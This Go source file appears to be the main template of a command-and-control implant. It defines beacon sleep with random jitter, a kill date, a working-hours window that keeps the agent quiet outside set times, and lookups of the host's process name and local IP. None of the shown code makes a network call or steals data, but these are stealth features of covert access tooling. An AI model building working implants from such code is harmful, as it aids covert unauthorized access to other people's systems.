package main

import (
	"math/rand/v2"
	"net"
	"os"
	"path/filepath"
	"sync"
	"time"

	"__NAME__/impl"
	"__NAME__/protocol"
)

var (
	agent impl.AgentImpl
	jobs  = impl.NewJobsController()

	stateMu     sync.RWMutex
	agentSleep  int
	agentJitter int
	killDate    int64
	workStart   int
	workEnd     int
)

func initProfileState(p *protocol.Profile) {
	stateMu.Lock()
	defer stateMu.Unlock()
	agentSleep = p.Sleep
	agentJitter = p.Jitter
	killDate = p.KillDate
	workStart = p.WorkStart
	workEnd = p.WorkEnd
	if agentSleep <= 0 {
		agentSleep = 5
	}
}

func processName() string {
	exe, err := os.Executable()
	if err != nil {
		return "__NAME__"
	}
	return filepath.Base(exe)
}

func localIPv4() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if !ok || ipNet.IP == nil {
				continue
			}
			if v4 := ipNet.IP.To4(); v4 != nil {
				return v4.String()
			}
		}
	}
	return ""
}

func sleepWithJitter() {
	stateMu.RLock()
	base := agentSleep
	jit := agentJitter
	stateMu.RUnlock()

	if base <= 0 {
		return
	}
	ms := base * 1000
	if jit > 0 && jit <= 90 {
		delta := ms * jit / 100
		ms += rand.IntN(2*delta+1) - delta
		if ms < 100 {
			ms = 100
		}
	}
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

func shouldExit() bool {
	stateMu.RLock()
	kd := killDate
	stateMu.RUnlock()
	return kd > 0 && time.Now().Unix() >= kd
}

func waitForWorkingHours() {
	for {
		stateMu.RLock()
		ws := workStart
		we := workEnd
		stateMu.RUnlock()

		if ws == 0 && we == 0 {
			return
		}

		now := time.Now()
		hhmm := now.Hour()*100 + now.Minute()
		if ws <= we {
			if hhmm >= ws && hhmm < we {
				return
			}
		} else {
			if hhmm >= ws || hhmm < we {
				return
			}
		}

		time.Sleep(60 * time.Second)
	}
}
